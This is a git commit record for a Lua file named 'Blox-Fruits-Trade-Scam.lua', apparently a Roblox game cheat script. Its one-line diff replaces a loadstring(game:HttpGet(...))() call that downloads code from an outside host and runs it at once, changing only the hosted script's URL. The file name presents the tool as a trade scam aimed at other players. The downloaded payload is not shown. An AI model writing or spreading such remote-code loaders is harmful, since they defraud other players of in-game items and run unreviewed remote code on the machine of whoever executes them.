8497dbeb851c2ec494cb512e945200b756f1c22d
VoidDeveloper67 <juniortype123@gmail.com>
2026-01-12 23:31:51 +0000

    Update Blox-Fruits-Trade-Scam.lua

--- Blox-Fruits-Trade-Scam.lua
+++ Blox-Fruits-Trade-Scam.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/0ce7a768dcaae448915454523074ddb1ddaeb127a28b16af407454d29fdbde99.lua"))()
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/2eb07c95b50e8da9f36c118fada824af9b198eefa191ca45092370aee9288d33.lua", true))()
